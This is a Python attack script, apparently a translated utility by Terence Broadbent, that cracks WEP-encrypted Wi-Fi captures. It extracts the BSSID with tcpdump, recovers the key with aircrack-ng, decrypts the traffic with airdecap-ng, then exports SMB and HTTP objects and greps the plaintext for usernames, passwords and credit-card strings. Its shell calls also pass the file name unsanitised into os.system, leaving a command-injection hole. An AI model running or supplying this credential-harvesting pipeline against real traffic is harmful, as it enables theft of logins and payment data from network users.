#!/usr/bin/python
# coding:UTF-8

# ------------------------------------------------------------------------------------- #
#      PYTHON UTILITY FILE TO CRACK ENCRYPTED .PCAP FILES CAPTURED BY WIRESHARK         #
#                BY TERENCE BROADBENT BSC CYBERSECURITY (FIRST CLASS)                   #
# ------------------------------------------------------------------------------------- #
# This is a script that has been borrowed, and translated to python3, from the original #
# ------------------------------------------------------------------------------------- #
# AUTHOR  : Terence Broadbent                                                           #
# ------------------------------------------------------------------------------------- #

import os
import platform
import sys
import colorlog

# Configure colorlog for logging messages with colors
logger = colorlog.getLogger()
logger.setLevel(colorlog.DEBUG)

handler = colorlog.StreamHandler()
formatter = colorlog.ColoredFormatter(
    "%(log_color)s%(levelname)-8s%(reset)s %(blue)s%(message)s",
    datefmt=None,
    reset=True,
    log_colors={
        "DEBUG": "cyan",
        "INFO": "green",
        "WARNING": "yellow",
        "ERROR": "red",
        "CRITICAL": "red",
    },
)
handler.setFormatter(formatter)
logger.addHandler(handler)

if platform.system() != "Linux":
    colorlog.critical("\nThis script is only compatible with Linux...\n")
    exit(True)

os.system("clear")

print(r"""
 " ____   ____    _    ____     ____ ____      _    ____ _  _______ ____   "
 "|  _ \ / ___|  / \  |  _ \   / ___|  _ \    / \  / ___| |/ / ____|  _ \  "
 "| |_) | |     / _ \ | |_) | | |   | |_) |  / _ \| |   | ' /|  _| | |_) | "
 "|  __/| |___ / ___ \|  __/  | |___|  _ <  / ___ \ |___| . \| |___|  _ <  "
 "|_|    \____/_/   \_\_|      \____|_| \_\/_/   \_\____|_|\_\_____|_| \_\ "
 "                                                                         "
""")

try:
    if os.geteuid() != 0:
        colorlog.critical("\nPlease run this python script as root...")
        exit(True)

    if len(sys.argv) < 2:
        colorlog.critical("\nUse the command python cracker.py file.pcap\n")
        exit(True)

    filename = sys.argv[1]

    if os.path.exists(filename) == 0:
        colorlog.critical(f"\nFile {filename} was not found, did you spell it correctly?")
        exit(True)

    checklist = ["airmon-ng", "tshark", "editcap", "pcapfix"]
    installed = True

    for check in checklist:
        cmd = "locate -i " + check + " > /dev/null"
        checked = os.system(cmd)
        if checked != 0:
            colorlog.warning("I could not find {check} in the system...")
            installed = False

    if not installed:
        colorlog.critical("\nInstall those missing dependencies before you begin...\n")
        exit(True)

    new_filetype = filename[:-2]
    typetest = filename[-6:]

    colorlog.debug("Filename: " + filename)
    colorlog.debug("File Format: " + typetest)

    if typetest == "pcapng":
        colorlog.info("Crack Status: Converting file format...")
        os.system("editcap -F pcap '" + filename + "' '" + new_filetype + "' > /dev/null")
        filename = filename[:-2]
        colorlog.debug("New Filename: " + filename)

    os.system("pcapfix -d '" + filename + "' -o Fixerror.pcap > /dev/null")

    if os.path.isfile('./Fixerror.pcap') != 0:
        os.rename(filename, "Oldpcapfile.pcap")
        os.rename("Fixerror.pcap", filename)
        colorlog.info(f"Crack Status: Fixing file errors for {filename}..")
        colorlog.debug("Original Renamed: Oldpcapfile.pcap")

    print('-' * 100)
    cmd = "tcpdump -ennr '" + filename + "' '(type mgt subtype beacon)' | awk '{print $13}' | sed 's/[()]//g;s/......//' | sort | uniq > SSID.txt"
    os.system(cmd)
    print('-' * 100)

    ssid = open("SSID.txt").readline().rstrip()
    os.remove('./SSID.txt')
    ssid = "00:" + ssid

    if ssid == "00:":
        colorlog.critical(f"Empty SSID: The ssid {ssid} was given, This is not allowed...")
        exit(True)
    else:
        colorlog.info(f"Service Set Id: {ssid}")

    os.system("aircrack-ng -b " + ssid + " '" + filename + "' > Answer.txt")
    os.system("awk '/KEY FOUND!/{print $(NF-1)}' Answer.txt > WepKey.txt")
    os.remove('./Answer.txt')
    wep = open("WepKey.txt").readline().rstrip()
    os.remove("./WepKey.txt")
    colorlog.info("Wired Privacy Key : " + wep)

    os.system("airdecap-ng -w " + wep + " '" + filename + "' " + "> /dev/null")
    filename2 = filename[:-5]
    filename2 += "-dec.pcap"
    os.rename(filename2, "Cracked.pcap")
    colorlog.info("Cracked File: Cracked.pcap")
    colorlog.info("Crack Status: Extracting Data...\n")

    os.system("tshark -nr Cracked.pcap --export-objects smb,Smbfolder > /dev/null 2>/dev/null")
    os.system("tshark -nr Cracked.pcap --export-objects http,Httpfolder > /dev/null 2>/dev/null")
    os.system("ngrep -q -I Cracked.pcap | grep -i username > Username.txt")
    os.system("ngrep -q -I Cracked.pcap | grep -i password > Password.txt")
    os.system("ngrep -q -I Cracked.pcap | grep -i credit > Creditcard.txt")
    os.system("ls -p")
except Exception as e:
    colorlog.error(e)
